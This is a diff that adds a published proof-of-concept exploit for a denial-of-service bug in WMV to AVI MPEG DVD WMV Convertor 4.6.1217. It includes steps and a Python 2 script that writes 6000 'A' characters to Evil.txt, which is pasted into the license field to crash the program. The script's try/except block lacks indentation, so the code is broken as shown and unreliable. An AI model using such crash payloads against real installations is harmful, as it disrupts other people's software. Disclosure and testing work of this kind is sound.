@@ -1,0 +1,28 @@
+# Exploit Title: WMV to AVI MPEG DVD WMV Convertor 4.6.1217 - Denial of Service
+# Date: 2019-10-30
+# Vendor Homepage:https://www.alloksoft.com/
+# Software Link:  https://www.alloksoft.com/wmv.htm
+# Exploit Author: Nithoshitha S
+# Tested Version: v4.6.1217
+# Tested on: Windows 7 x64
+#            Windows XP SP3
+
+# 1.- Run python code :poc.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open  WMV to AVI MPEG DVD WMV Convertor and Click 'EnterKey'
+# 4.- Paste the content of EVIL.txt into the Field: 'License Name and License Code'
+# 5.- Click 'OK' and you will see a crash.
+
+# poc.py
+
+#!/usr/bin/env python
+buffer = "\x41" * 6000
+
+try:
+f=open("Evil.txt","w")
+print "[+] Creating %s bytes evil payload.." %len(buffer)
+f.write(buffer)
+f.close()
+print "[+] File created!"
+except:
+print "File cannot be created"
